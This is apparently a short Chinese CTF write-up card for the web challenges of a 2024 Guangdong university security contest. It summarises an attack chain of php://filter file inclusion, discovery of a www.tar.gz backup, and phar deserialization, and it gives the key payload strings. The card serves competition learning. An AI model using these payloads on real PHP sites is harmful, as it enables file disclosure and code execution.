---
title: "第三届广东省大学生网络攻防竞赛WriteUp"
category: web
tags: ["第三届广东省大学生网络攻防竞赛", "web", "广东大学生网安赛", "php://filter文件包含", "phar反序列化", "www.tar.gz备份"]
signals: ["第三届广东省大学生网络攻防竞赛 2024", "广东大学生网安赛", "php://filter文件包含", "phar反序列化", "www.tar.gz备份", "File类__construct", "convert.iconv.UTF-8.UCS-2", "web_unknown", "php", "filter", "phar", "web1", "convert"]
difficulty: medium
source: "https://www.ctfiot.com/181138.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第三届广东省大学生网络攻防竞赛WriteUp

> 赛事：第三届广东省大学生网络攻防竞赛 2024 | 方向：web | 难度：medium

## 一句话总结

第三届广东大学生网安赛：php://filter文件包含+phar反序列化

## 攻击链

1. web1:文件包含php://filter/convert.iconv.UTF-8.UCS-2/resource=/flag→web2:目录扫描www.tar.gz→审计反序列化+phar生成→setMetadata(File类__construct触发__destruct)

## 关键 payload

```
php://filter/convert.iconv.UTF-8.UCS-2/resource=/flag;www.tar.gz;phar生成:phar->setStub('GIF89a'.'<?php __HALT_COMPILER(); ? >');$phar->setMetadata(new File())
```

## 经验教训

phar协议反序列化是PHP文件上传常见漏洞链

## 标签

广东大学生网安赛、php://filter文件包含、phar反序列化、www.tar.gz备份、File类__construct、convert.iconv.UTF-8.UCS-2

## 参考来源

- https://www.ctfiot.com/181138.html
- 原文件：第三届广东省大学生网络攻防竞赛WriteUp.full.md
